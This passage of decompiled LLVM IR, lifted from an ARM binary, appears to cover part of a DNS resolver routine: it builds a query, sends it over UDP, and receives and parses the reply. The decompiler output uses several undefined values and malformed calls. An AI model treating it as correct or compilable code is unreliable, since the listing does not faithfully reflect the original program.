  %v3_1101c = inttoptr i32 %v2_1101c to i16*
  %v4_1101c = load i16, i16* %v3_1101c, align 2
  %v6_1101c = zext i16 %v4_1101c to i32
  %v2_11020 = add i32 %v0_11008, 9512
  %v3_11020 = inttoptr i32 %v2_11020 to i32*
  %v4_11020 = load i32, i32* %v3_11020, align 4
  store i32 %v4_11020, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11030

dec_label_pc_11030:                               ; preds = %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge, %dec_label_pc_11000
  %v2_11074 = phi i32 [ %v0_11008, %dec_label_pc_11000 ], [ %v0_11038.pre, %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1101c, %dec_label_pc_11000 ], [ %stack_var_-464.0, %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_11020, %dec_label_pc_11000 ], [ %stack_var_-468.0, %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_11010, %dec_label_pc_11000 ], [ %stack_var_-476.0, %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge ]
  store i32 10480, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_11038 = add i32 %v2_11074, 10480
  %v3_11038 = inttoptr i32 %v2_11038 to i32*
  %v4_11038 = load i32, i32* %v3_11038, align 4
  store i32 10476, i32* %r3.global-to-local, align 4
  %v3_11040 = icmp uge i32 %stack_var_-468.1, %v4_11038
  store i1 %v3_11040, i1* %cpsr_c.global-to-local, align 1
  %v2_11044 = add i32 %v2_11074, 10476
  %v3_11044 = inttoptr i32 %v2_11044 to i32*
  %v4_11044 = load i32, i32* %v3_11044, align 4
  store i32 %v4_11044, i32* %r3.global-to-local, align 4
  br i1 %v3_11040, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_11030
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_11030, %bb217
  %v0_11050 = phi i32 [ %stack_var_-468.1, %dec_label_pc_11030 ], [ 0, %bb217 ]
  %v3_11050 = mul i32 %v0_11050, 28
  %v4_11050 = add i32 %v3_11050, %v4_11044
  store i32 %v4_11050, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1105c = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11068 = urem i32 %v1_1105c, 65536
  store i32 9512, i32* %r1.global-to-local, align 4
  %v1_11074 = trunc i32 %v1_1105c to i16
  %v4_11074 = add i32 %v2_11074, 724
  %v5_11074 = inttoptr i32 %v4_11074 to i16*
  store i16 %v1_11074, i16* %v5_11074, align 2
  %v1_1107c = load i32, i32* @r8, align 4
  %v2_1107c = load i32, i32* %r1.global-to-local, align 4
  %v3_1107c = add i32 %v2_1107c, %v1_1107c
  %v4_1107c = inttoptr i32 %v3_1107c to i32*
  store i32 %v0_11050, i32* %v4_1107c, align 4
  %v0_11080 = load i32, i32* %r3.global-to-local, align 4
  %v1_11084 = inttoptr i32 %v0_11080 to i32*
  %v2_11084 = load i32, i32* %v1_11084, align 4
  %v3_11084 = add i32 %v0_11080, 4
  %v4_11084 = inttoptr i32 %v3_11084 to i32*
  %v5_11084 = load i32, i32* %v4_11084, align 4
  store i32 %v5_11084, i32* %r1.global-to-local, align 4
  %v9_11084 = add i32 %v0_11080, 12
  %v10_11084 = inttoptr i32 %v9_11084 to i32*
  %v11_11084 = load i32, i32* %v10_11084, align 4
  store i32 %v11_11084, i32* %r3.global-to-local, align 4
  %v12_11084 = add i32 %v0_11080, 16
  %v4_1108c = trunc i32 %v2_11084 to i16
  store i16 %v4_1108c, i16* %stack_var_-104, align 2
  store i32 %v15_1108c, i32* %ip.global-to-local, align 4
  %v1_11090 = inttoptr i32 %v12_11084 to i32*
  %v2_11090 = load i32, i32* %v1_11090, align 4
  %v3_11090 = add i32 %v0_11080, 20
  %v4_11090 = inttoptr i32 %v3_11090 to i32*
  %v5_11090 = load i32, i32* %v4_11090, align 4
  store i32 %v5_11090, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_11090, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_110a4 = load i32, i32* @r8, align 4
  %v2_110a4 = add i32 %v0_110a4, 24
  %v3_110a4 = inttoptr i32 %v2_110a4 to i32*
  %v4_110a4 = load i32, i32* %v3_110a4, align 4
  store i32 %v4_110a4, i32* %ip.global-to-local, align 4
  store i32 69808, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_110a4)
  store i32 %v2_110b0, i32* @r6, align 4
  %v0_110b4 = load i32, i32* @r7, align 4
  store i32 %v0_110b4, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_110bc = load i32, i32* @sl, align 4
  %v2_110c0 = inttoptr i32 %v0_110bc to i8*
  %v3_110c0 = call i32 @__GI_memset(i8* %v2_110c0, i32 %v0_110b4)
  %v0_110c4 = load i32, i32* @r7, align 4
  store i32 %v0_110c4, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_110d0 = call i32 @__GI_memset(i8* %v2_110d0, i32 %v0_110c4)
  store i32 %v3_11068, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_110e0 = load i32, i32* @sl, align 4
  store i32 %v0_110e0, i32* %r1.global-to-local, align 4
  store i32 %v3_11068, i32* %stack_var_-192, align 4
  %v6_110f4 = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_110e0, i32 512, i32 %v3_11068, i32 %v3_11068)
  store i32 %v6_110f4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_110f8 = icmp slt i32 %v6_110f4, 0
  br i1 %v1_110f8, label %dec_label_pc_115b4, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %bb218
  store i32 %v0_10e6c, i32* @ip, align 4
  store i32 %v1_10eb4, i32* @r5, align 4
  %v0_11110 = load i32, i32* @sl, align 4
  %v2_11110 = add i32 %v0_11110, %v6_110f4
  store i32 %v2_11110, i32* %r1.global-to-local, align 4
  %v1_11114 = sub i32 512, %v6_110f4
  store i32 %v1_10eb4, i32* %stack_var_-60, align 4
  store i32 %v0_10e6c, i32* %stack_var_-56, align 4
  %v4_11120 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_11110, i32 %v1_11114)
  store i32 %v4_11120, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11124 = icmp slt i32 %v4_11120, 0
  br i1 %v1_11124, label %dec_label_pc_115b4, label %dec_label_pc_1112c

dec_label_pc_1112c:                               ; preds = %dec_label_pc_11100
  %v3_11130 = load i16, i16* %stack_var_-104, align 2
  %v4_11130 = sext i16 %v3_11130 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1113c = call i32 @socket(i32 %v4_11130, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11140 = icmp slt i32 %v3_1113c, 0
  br i1 %v1_11140, label %dec_label_pc_1158c, label %dec_label_pc_1114c

dec_label_pc_1114c:                               ; preds = %dec_label_pc_1112c
  store i32 %v2_11088, i32* %r1.global-to-local, align 4
  %v3_11154 = call i32 @__libc_connect(i32 %v3_1113c, i32 %v2_11088, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11158 = icmp slt i32 %v3_11154, 0
  br i1 %v1_11158, label %dec_label_pc_1158c, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_1114c
  %v0_11160 = load i32, i32* @r5, align 4
  %v1_11160 = load i32, i32* @r4, align 4
  %v2_11160 = add i32 %v1_11160, %v0_11160
  %v0_11164 = load i32, i32* @r7, align 4
  store i32 %v0_11164, i32* %r3.global-to-local, align 4
  %v0_1116c = load i32, i32* @sl, align 4
  store i32 %v0_1116c, i32* %r1.global-to-local, align 4
  %v5_11170 = call i32 @__libc_send(i32 %v3_1113c, i32 %v0_1116c, i32 %v2_11160, i32 %v0_11164, i32 ptrtoint (i32* @0 to i32))
  store i32 726, i32* %r3.global-to-local, align 4
  %v0_11178 = load i32, i32* @r8, align 4
  %v2_11178 = add i32 %v0_11178, 726
  %v3_11178 = inttoptr i32 %v2_11178 to i8*
  %v4_11178 = load i8, i8* %v3_11178, align 1
  %v6_11178 = zext i8 %v4_11178 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_11180 = mul nuw nsw i32 %v6_11178, 1000
  store i32 %v2_11180, i32* @r4, align 4
  store i32 %v2_11184, i32* @r5, align 4
  br label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %thread-pre-split, %dec_label_pc_11160
  %v0_11194 = phi i32 [ %v1_111d4, %thread-pre-split ], [ %v2_11180, %dec_label_pc_11160 ]
  store i32 %v3_1113c, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_11190, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1113c, i32* %stack_var_-48, align 4
  %v7_111a8 = call i32 @__GI_poll(i32 %v2_11184, i32 1, i32 %v0_11194, i32 %v3_1113c, i32 %v3_1113c, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_111b0 = load i32, i32* @sl, align 4
  store i32 %v0_111b0, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_111a8, 1
  br i1 %tmp219, label %dec_label_pc_1158c, label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_11188
  %v5_111c4 = call i32 @__libc_recv(i32 %v3_1113c, i32 %v0_111b0, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_111c8 = icmp ugt i32 %v5_111c4, 10
  store i1 %v2_111c8, i1* %cpsr_c.global-to-local, align 1
  %v8_111d0 = icmp sgt i32 %v5_111c4, 11
  br i1 %v8_111d0, label %dec_label_pc_111fc, label %dec_label_pc_111d4

dec_label_pc_111d4:                               ; preds = %dec_label_pc_111fc, %dec_label_pc_11218, %dec_label_pc_111c4
  %v0_111d4 = load i32, i32* @r4, align 4
  %v1_111d4 = add i32 %v0_111d4, -1000
  store i32 %v1_111d4, i32* @r4, align 4
  %v7_111d4 = icmp eq i32 %v0_111d4, 1000
  %tmp283 = zext i1 %v7_111d4 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_111e4 = icmp slt i32 %v5_111c4, 0
  br i1 %v1_111e4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_111d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1158c

thread-pre-split:                                 ; preds = %dec_label_pc_111d4
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_111d4, label %dec_label_pc_1158c, label %dec_label_pc_11188

dec_label_pc_111fc:                               ; preds = %dec_label_pc_111c4
  store i32 %v2_110b0, i32* %r1.global-to-local, align 4
  %v0_11200 = load i32, i32* @sl, align 4
  %v2_11204 = inttoptr i32 %v0_11200 to i8*
  %v3_11204 = call i32 @__decode_header(i8* %v2_11204, i32 %v2_110b0)
  %v3_11208 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_11208, i32* %r3.global-to-local, align 4
  store i32 %v3_11068, i32* %r1.global-to-local, align 4
  %v3_11210 = icmp uge i32 %v3_11208, %v3_11068
  store i1 %v3_11210, i1* %cpsr_c.global-to-local, align 1
  %v9_11210 = icmp eq i32 %v3_11208, %v3_11068
  br i1 %v9_11210, label %dec_label_pc_11218, label %dec_label_pc_111d4

dec_label_pc_11218:                               ; preds = %dec_label_pc_111fc
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1121c, label %dec_label_pc_111d4, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_11218
  store i32 %v1_11228, i32* %r3.global-to-local, align 4
  store i1 %v2_1122c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_11228.cmp, label %dec_label_pc_11260, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_11224
  store i1 %v2_11238, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_11238, label %dec_label_pc_11254, label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_11234
  store i32 %v4_10fac, i32* @r5, align 4
  %v1_11244 = add i32 %v4_10fac, -1
  store i32 %v1_11244, i32* %r3.global-to-local, align 4
  %v0_11248 = load i32, i32* @sb, align 4
  %v3_11248 = icmp uge i32 %v0_11248, %v1_11244
  store i1 %v3_11248, i1* %cpsr_c.global-to-local, align 1
  %v5_1124c = icmp slt i32 %v0_11248, %v1_11244
  br i1 %v5_1124c, label %.thread7, label %dec_label_pc_11254

.thread7:                                         ; preds = %dec_label_pc_11240
  %v7_1124c = add i32 %v0_11248, 1
  br label %dec_label_pc_1159c

dec_label_pc_11254:                               ; preds = %dec_label_pc_11240, %dec_label_pc_11234
  %v0_11254 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_11288

dec_label_pc_11260:                               ; preds = %dec_label_pc_11224
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_11260, label %dec_label_pc_11268, label %dec_label_pc_1158c

dec_label_pc_11268:                               ; preds = %dec_label_pc_11260
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_11280, label %dec_label_pc_11290

dec_label_pc_11280:                               ; preds = %dec_label_pc_11268
  %v0_11280 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %dec_label_pc_11254, %dec_label_pc_11280
  %storemerge2 = phi i32 [ %v0_11280, %dec_label_pc_11280 ], [ %v0_11254, %dec_label_pc_11254 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_11280 ], [ 1, %dec_label_pc_11254 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_11288 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_11288, align 4
  br label %dec_label_pc_115d4

dec_label_pc_11290:                               ; preds = %dec_label_pc_11268
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_11294.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_11294 = add i32 %v0_11294.pre, 12
  store i32 %v2_11294, i32* @r4, align 4
  %v3_11294 = icmp ugt i32 %v0_11294.pre, -13
  store i1 %v3_11294, i1* %cpsr_c.global-to-local, align 1
  %v9_11294 = icmp eq i32 %v2_11294, 0
  br i1 %v9_11294, label %dec_label_pc_1158c, label %dec_label_pc_1129c

dec_label_pc_1129c:                               ; preds = %dec_label_pc_11290
  %v2_112a0 = add i32 %v5_111c4, -12
  store i32 %v2_112a0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_112a0, 1
  br i1 %tmp223, label %dec_label_pc_1158c, label %dec_label_pc_112b0

dec_label_pc_112a8thread-pre-split:               ; preds = %dec_label_pc_112cc
  %v2_112d815 = add i32 %v2_112bc, -1
  store i32 %v2_112d815, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_112d815, 1
  br i1 %tmp224, label %dec_label_pc_1158c, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_1129c, %dec_label_pc_112a8thread-pre-split
  %v1_112d4 = phi i32 [ %v2_112d815, %dec_label_pc_112a8thread-pre-split ], [ %v2_112a0, %dec_label_pc_1129c ]
  %v0_112b0 = phi i32 [ %v2_112c4, %dec_label_pc_112a8thread-pre-split ], [ %v2_11294, %dec_label_pc_1129c ]
  %v1_112b0 = inttoptr i32 %v0_112b0 to i8*
  %v2_112b0 = load i8, i8* %v1_112b0, align 1
  %v3_112b0 = zext i8 %v2_112b0 to i32
  store i32 %v3_112b0, i32* %r3.global-to-local, align 4
  %v5_112b0 = add i32 %v0_112b0, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112b4 = icmp eq i8 %v2_112b0, 0
  %v2_112bc = sub i32 %v1_112d4, %v3_112b0
  store i32 %v2_112bc, i32* @lr, align 4
  %v1_112c0 = and i32 %v3_112b0, 192
  store i32 %v1_112c0, i32* @ip, align 4
  %v2_112c4 = add i32 %v3_112b0, %v5_112b0
  br i1 %v2_112b4, label %dec_label_pc_112e0, label %dec_label_pc_112cc

dec_label_pc_112cc:                               ; preds = %dec_label_pc_112b0
  %v2_112cc = icmp eq i32 %v1_112c0, 192
  store i1 %v2_112cc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_112cc, label %.thread9, label %dec_label_pc_112a8thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_112cc
  %v2_112d0 = add i32 %v0_112b0, 2
  %v2_112d4 = add i32 %v1_112d4, -2
  store i32 %v2_112d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_112e0

dec_label_pc_112e0:                               ; preds = %dec_label_pc_112b0, %.thread9
  %v1_112ec = phi i32 [ %v2_112d0, %.thread9 ], [ %v5_112b0, %dec_label_pc_112b0 ]
  %v0_112e0 = phi i32 [ %v2_112d4, %.thread9 ], [ %v1_112d4, %dec_label_pc_112b0 ]
  %v1_112e0 = add i32 %v0_112e0, -3
  %v2_112e0 = icmp ugt i32 %v0_112e0, 2
  store i1 %v2_112e0, i1* %cpsr_c.global-to-local, align 1
  %v3_112e0 = sub i32 2, %v0_112e0
  %v4_112e0 = and i32 %v3_112e0, %v0_112e0
  %v5_112e0 = icmp slt i32 %v4_112e0, 0
  %v6_112e0 = icmp slt i32 %v1_112e0, 0
  %v7_112e0 = icmp eq i32 %v0_112e0, 3
  %v3_112e4 = xor i1 %v6_112e0, %v5_112e0
  %v4_112e4 = or i1 %v7_112e0, %v3_112e4
  br i1 %v4_112e4, label %dec_label_pc_1158c, label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %dec_label_pc_112e0
  %v1_112e8 = sub i32 -8, %v0_11294.pre
  %v2_112ec = add i32 %v1_112ec, %v1_112e8
  store i32 %v2_112ec, i32* %r3.global-to-local, align 4
  %v3_112ec = icmp ult i32 %v2_112ec, %v1_112e8
  store i1 %v3_112ec, i1* %cpsr_c.global-to-local, align 1
  %v8_112ec = icmp slt i32 %v2_112ec, 0
  br i1 %v8_112ec, label %dec_label_pc_1158c, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %dec_label_pc_112e8
  %v2_112f8 = add i32 %v2_112ec, 12
  store i32 %v2_112f8, i32* %r1.global-to-local, align 4
  store i32 %v2_11318, i32* @r5, align 4
  store i32 %v2_1131c, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1156056, label %dec_label_pc_11334, label %dec_label_pc_11564

dec_label_pc_11334:                               ; preds = %dec_label_pc_11310, %dec_label_pc_1153c.dec_label_pc_11334_crit_edge
  %v0_11338 = phi i32 [ %v0_11338.pre, %dec_label_pc_1153c.dec_label_pc_11334_crit_edge ], [ %v0_11294.pre, %dec_label_pc_11310 ]
  %stack_var_-460.364 = phi i32 [ %v2_11544, %dec_label_pc_1153c.dec_label_pc_11334_crit_edge ], [ %v2_112f8, %dec_label_pc_11310 ]
  %stack_var_-452.061 = phi i32 [ %v1_11548, %dec_label_pc_1153c.dec_label_pc_11334_crit_edge ], [ 0, %dec_label_pc_11310 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1153c.dec_label_pc_11334_crit_edge ], [ 1, %dec_label_pc_11310 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_11318, i32* %r3.global-to-local, align 4
  %v5_1134c = call i32 @__decode_dotted(i32 %v0_11338, i32 %stack_var_-460.364, i32 %v5_111c4, i32 %v2_11318, i32 256)
  store i32 %v5_1134c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11350 = icmp slt i32 %v5_1134c, 0
  br i1 %v1_11350, label %dec_label_pc_11420, label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_11334
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_11360 = add i32 %v5_1134c, 10
  store i32 %v1_11360, i32* @sb, align 4
  %v2_11364 = sub i32 %v5_111c4, %stack_var_-460.364
  %v2_11368 = sub i32 %v2_11364, %v1_11360
  store i32 %v2_11368, i32* %r3.global-to-local, align 4
  %v3_11368 = icmp uge i32 %v2_11364, %v1_11360
  store i1 %v3_11368, i1* %cpsr_c.global-to-local, align 1
  %v8_11368 = icmp slt i32 %v2_11368, 0
  br i1 %v8_11368, label %dec_label_pc_11418.thread, label %dec_label_pc_11378

dec_label_pc_11418.thread:                        ; preds = %dec_label_pc_11358
  store i32 %v2_11368, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_11420

dec_label_pc_11378:                               ; preds = %dec_label_pc_11358
  %v2_1137c = call i32 @__GI_strdup(i8* %v1_1137c)
  %v0_11384 = load i32, i32* @r4, align 4
  %v2_11384 = add i32 %v0_11384, %stack_var_-460.364
  %v0_11388 = load i32, i32* @sl, align 4
  %v2_11388 = add i32 %v0_11388, %v2_11384
  store i32 %v2_11388, i32* %r1.global-to-local, align 4
  %v1_1138c = add i32 %v2_11388, 2
  store i32 %v1_1138c, i32* %ip.global-to-local, align 4
  %v1_11390 = add i32 %v2_11388, 4
  store i32 %v1_11390, i32* %r3.global-to-local, align 4
  %v1_11394 = add i32 %v2_11388, 5
  %v2_11394 = inttoptr i32 %v1_11394 to i8*
  %v3_11394 = load i8, i8* %v2_11394, align 1
  %v4_11394 = zext i8 %v3_11394 to i32
  %v1_1139c = add i32 %v2_11388, 8
  %v2_1139c = inttoptr i32 %v1_1139c to i8*
  %v3_1139c = load i8, i8* %v2_1139c, align 1
  %v4_1139c = zext i8 %v3_1139c to i32
  %v1_113a8 = add i32 %v2_11388, 6
  %v2_113a8 = inttoptr i32 %v1_113a8 to i8*
  %v3_113a8 = load i8, i8* %v2_113a8, align 1
  %v4_113a8 = zext i8 %v3_113a8 to i32
  store i32 %v4_113a8, i32* %r3.global-to-local, align 4
  %v1_113ac = add i32 %v2_11388, 9
  %v2_113ac = inttoptr i32 %v1_113ac to i8*
  %v3_113ac = load i8, i8* %v2_113ac, align 1
  %v4_113ac = zext i8 %v3_113ac to i32
  %v3_113b4 = inttoptr i32 %v2_11388 to i8*
  %v4_113b4 = load i8, i8* %v3_113b4, align 1
  %v6_113b4 = zext i8 %v4_113b4 to i32
  %v1_113b8 = add i32 %v2_11388, 3
  %v2_113b8 = inttoptr i32 %v1_113b8 to i8*
  %v3_113b8 = load i8, i8* %v2_113b8, align 1
  %v4_113b8 = zext i8 %v3_113b8 to i32
  store i32 %v4_113b8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_113c0 = inttoptr i32 %v1_1138c to i8*
  %v3_113c0 = load i8, i8* %v2_113c0, align 1
  %v4_113c0 = zext i8 %v3_113c0 to i32
  store i32 %v4_113c0, i32* %ip.global-to-local, align 4
  %v1_113c4 = add i32 %v2_11388, 1
  %v2_113c4 = inttoptr i32 %v1_113c4 to i8*
  %v3_113c4 = load i8, i8* %v2_113c4, align 1
  %v4_113c4 = zext i8 %v3_113c4 to i32
  %v4_113c8 = mul nuw nsw i32 %v4_1139c, 256
  %v5_113c8 = or i32 %v4_113ac, %v4_113c8
  store i32 %v5_113c8, i32* @r6, align 4
  store i32 %v4_11394, i32* @r7, align 4
  %v4_113d0 = mul nuw nsw i32 %v6_113b4, 256
  %v5_113d0 = or i32 %v4_113c4, %v4_113d0
  store i32 %v5_113d0, i32* @lr, align 4
  %v4_113d4 = mul nuw nsw i32 %v4_113c0, 256
  %v5_113d4 = or i32 %v4_113d4, %v4_113b8
  store i32 %v5_113d4, i32* %r3.global-to-local, align 4
  store i32 %v2_11368, i32* @r5, align 4
  store i32 %v4_113a8, i32* @ip, align 4
  %v1_113e8 = add i32 %v2_11388, 10
  store i32 %v1_113e8, i32* %r1.global-to-local, align 4
  %v1_113ec = add i32 %v2_11384, 10
  store i32 %v1_113ec, i32* @r4, align 4
  %v2_113f0 = sub i32 %v2_11368, %v5_113c8
  %v3_113f0 = icmp uge i32 %v2_11368, %v5_113c8
  store i1 %v3_113f0, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_113f0
  %v6_113f0 = and i32 %v2_11368, %tmp226
  %v7_113f0 = icmp slt i32 %v6_113f0, 0
  %v8_113f0 = icmp slt i32 %v2_113f0, 0
  store i32 %v2_1137c, i32* %stack_var_-144, align 4
  %v2_11410 = xor i1 %v8_113f0, %v7_113f0
  br i1 %v2_11410, label %dec_label_pc_11420, label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %dec_label_pc_11378
  %v0_11414 = load i32, i32* @sb, align 4
  %v2_11414 = add i32 %v0_11414, %v5_113c8
  store i32 %v2_11414, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_11418 = icmp slt i32 %v2_11414, 0
  br i1 %v1_11418, label %dec_label_pc_11420, label %dec_label_pc_1143c

dec_label_pc_11420:                               ; preds = %dec_label_pc_11418, %dec_label_pc_11378, %dec_label_pc_11334, %dec_label_pc_11418.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11424 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_11424, label %dec_label_pc_1158c, label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %dec_label_pc_11420
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_11430, label %dec_label_pc_1158c, label %dec_label_pc_11564

dec_label_pc_1143c:                               ; preds = %dec_label_pc_11418
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11440 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_11440, label %dec_label_pc_114e4, label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %dec_label_pc_1143c
  %v0_11448 = load i32, i32* @fp, align 4
  %v1_11448 = add i32 %v0_11448, 28
  store i32 %v1_11448, i32* %r3.global-to-local, align 4
  %v1_1144c = inttoptr i32 %v1_11448 to i32*
  %v2_1144c = load i32, i32* %v1_1144c, align 4
  store i32 %v2_1144c, i32* @r3, align 4
  %v3_1144c = add i32 %v0_11448, 32
  %v4_1144c = inttoptr i32 %v3_1144c to i32*
  %v5_1144c = load i32, i32* %v4_1144c, align 4
  store i32 %v5_1144c, i32* @ip, align 4
  %v6_1144c = add i32 %v0_11448, 36
  %v7_1144c = inttoptr i32 %v6_1144c to i32*
  %v8_1144c = load i32, i32* %v7_1144c, align 4
  store i32 %v8_1144c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_11448, i32* @r0, align 4
  store i32 %v2_1131c, i32* @r1, align 4
  %v0_11468 = call i32 @memcpy()
  %v0_1146c = load i32, i32* @fp, align 4
  %v1_1146c = add i32 %v0_1146c, 4
  %v2_1146c = inttoptr i32 %v1_1146c to i32*
  %v3_1146c = load i32, i32* %v2_1146c, align 4
  %v2_11470 = icmp ugt i32 %v3_1146c, 23
  store i1 %v2_11470, i1* %cpsr_c.global-to-local, align 1
  %v7_11470 = icmp eq i32 %v3_1146c, 24
  br i1 %v7_11470, label %dec_label_pc_11494, label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %dec_label_pc_11448
  %v1_11478 = add i32 %v0_1146c, 28
  %v2_11478 = inttoptr i32 %v1_11478 to i32*
  %v3_11478 = load i32, i32* %v2_11478, align 4
  store i32 %v3_11478, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1147c = icmp eq i32 %v3_11478, 0
  br i1 %v2_1147c, label %dec_label_pc_11564, label %dec_label_pc_11484

dec_label_pc_11484:                               ; preds = %dec_label_pc_11478
  store i1 %v2_11488, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_11488, label %dec_label_pc_11494, label %bb227

bb227:                                            ; preds = %dec_label_pc_11484
  store i1 %v3_1148c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1148c, label %dec_label_pc_11494, label %dec_label_pc_11564

dec_label_pc_11494:                               ; preds = %dec_label_pc_11484, %bb227, %dec_label_pc_11448
  store i32 %v0_10e6c, i32* %r1.global-to-local, align 4
  %v3_11498 = icmp uge i32 %v3_1146c, %v0_10e6c
  store i1 %v3_11498, i1* %cpsr_c.global-to-local, align 1
  %v9_11498 = icmp eq i32 %v3_1146c, %v0_10e6c
  br i1 %v9_11498, label %dec_label_pc_114a8, label %bb228

bb228:                                            ; preds = %dec_label_pc_11494
  br label %dec_label_pc_1153c

